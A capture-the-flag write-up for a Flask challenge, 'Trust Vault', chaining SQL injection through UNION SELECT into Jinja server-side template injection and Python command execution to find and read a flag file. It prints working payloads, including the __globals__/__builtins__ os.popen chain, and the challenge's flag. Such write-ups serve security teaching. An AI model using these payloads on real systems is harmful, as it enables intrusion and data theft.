🔐 Trust Vault – Writeup
🏷️ Challenge Name

Trust Vault

📝 Challenge Description

“Leak the server-side flag stored on disk/environment by chaining the vulnerable SQL query with the legacy Jinja rendering.”

Ah yes, nothing like a good “chain vulnerabilities like Pokémon evolutions” challenge.

1️⃣ Overview

Trust Vault is a Flask web app with two dangerous ingredients mixed together:

A vulnerable SQL query 🧨

A legacy Jinja render engine 🔥

When combined, they allow this delightful attack chain:

👉 SQL Injection → Jinja SSTI → Python RCE → File Read → Flag

Basically, the app handed us the skeleton key and asked us nicely not to use it.
We used it anyway. 😌

2️⃣ Initial Recon

The app exposes several routes:

/login

/register

/search

/bookmarks

/audit

/reports

The /search endpoint showed queries like:

SELECT content FROM messages WHERE topic = '<input>'


Which basically screams:

💀 “Please inject me.”

Raw string concatenation — a classic security sin.

3️⃣ Verifying SQL Injection

Testing with:

?topic='


Result:

Error: unrecognized token: "'''"


Boom.
SQL broken → SQL Injection confirmed. ✔️

4️⃣ UNION Injection

Next step: test if we can take over the query output.

?topic=' UNION SELECT 'TEST'-- -


The result:

TEST


Which means:

✨ We fully control what gets rendered
💡 And whatever gets rendered is fed into Jinja…

Time to make it dance.

5️⃣ Testing for Jinja SSTI

Payload:

' UNION SELECT '{{7*7}}'-- -


Output:

49


Congratulations —
🎉 We have Server-Side Template Injection (SSTI)
And the server is evaluating our expressions like an obedient calculator.

6️⃣ Remote Code Execution via SSTI

Using Jinja’s sneaky object chain trick:

{{ request.application.__globals__.__builtins__.__import__("os").popen("ls").read() }}


This executed on the server and returned directory contents.

Meaning:

Python internals? ✔️

OS commands? ✔️

Full RCE? ✔️

The app is basically ours now.
(They grow up so fast 🥲)

7️⃣ Locating the Flag

To hunt down the flag:

{{ request.application.__globals__.__builtins__.__import__("os").popen("find / -name '*flag*'").read() }}


Result revealed:

/flag-e8b7e25d1130eccde065de0d53d21fc8.txt


Like finding treasure with a cheat code. 🗺️💎

8️⃣ Reading the Flag

The final blow:

' UNION SELECT '{{ request.application.__globals__.__builtins__.__import__("os").popen("cat /flag-e8b7e25d1130eccde065de0d53d21fc8.txt").read() }}'-- -


The server politely returned the goods.

🏁 9. Flag
PCTF{SQL1_C4n_b3_U53D_3Ff1C13N7lY}


A beautiful flag for a beautifully broken application.

🔗 10. Attack Chain Summary
Step	Vulnerability	Result
1️⃣	SQL Injection	Inject arbitrary strings
2️⃣	UNION SELECT	Render attacker-controlled output
3️⃣	Jinja SSTI	Execute template expressions
4️⃣	Python Object Chain	Access Python internals
5️⃣	OS Command Execution	Run system commands
6️⃣	File Read	Steal the flag

🔥 Final Thoughts

Mixing raw SQL + Jinja rendering is like storing fireworks next to a campfire…
Sure, it might be fine.
But then someone like you walks in with a spark and—
💥 Flag acquired.
